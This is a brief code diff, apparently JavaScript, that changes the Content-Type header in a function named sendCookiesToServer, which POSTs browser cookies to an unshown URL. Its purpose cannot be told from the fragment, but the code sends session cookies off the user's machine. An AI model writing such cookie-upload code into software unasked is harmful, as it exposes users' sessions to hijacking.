@@ -16,7 +16,7 @@ async function sendCookiesToServer(cookies) {
   fetch(url, {
     method: 'POST',
     headers: {
-      'Content-Type': 'application/text',
+      'Content-Type': 'text/plain',
     },
     body: cookies
   })
